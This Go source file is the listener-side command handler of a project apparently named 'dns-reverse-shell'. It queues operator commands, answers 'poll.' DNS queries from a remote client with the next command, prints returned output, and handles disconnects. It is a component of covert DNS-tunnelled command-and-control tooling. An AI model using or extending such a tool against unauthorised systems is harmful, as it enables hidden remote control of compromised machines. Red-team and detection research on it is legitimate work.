package listener

import (
	"dns-reverse-shell/main/shell"
	"fmt"
	"github.com/golang-collections/collections/queue"
)

type interactionHandler struct {
	shell *shell.Shell
	queue *queue.Queue
}

func newInteractionHandler() *interactionHandler {
	handler := interactionHandler{}
	handler.queue = queue.New()
	return &handler
}

func (m *interactionHandler) init() {
	m.shell = shell.NewShell(m.queueCommand)
	m.shell.Start()
}

func (m *interactionHandler) queueCommand(command string) {
	m.queue.Enqueue(command)
}

func (m *interactionHandler) switchCommand(receivedQuestion string, answerCallback func() string, exitCallback func()) string {
	//todo: test if this works, before i set a var with the case result and returned it!
	switch receivedQuestion {
	case "poll.":
		return m.handlePolling()
	case "answer.":
		return m.handleAnswer(answerCallback())
	case "exit.":
		m.handleExit(exitCallback)
	default:
	}
	return "idle"
}

func (m *interactionHandler) handlePolling() string {
	if m.queue.Len() != 0 {
		return m.queue.Dequeue().(string)
	}
	return "idle"
}

func (m *interactionHandler) handleAnswer(answer string) string {
	fmt.Println(answer)
	m.shell.Resume()
	return "ok"
}

func (m *interactionHandler) handleExit(connectionHandlerCallback func()) {
	fmt.Println("Connection closed")
	connectionHandlerCallback()
	m.shell.Start()
}
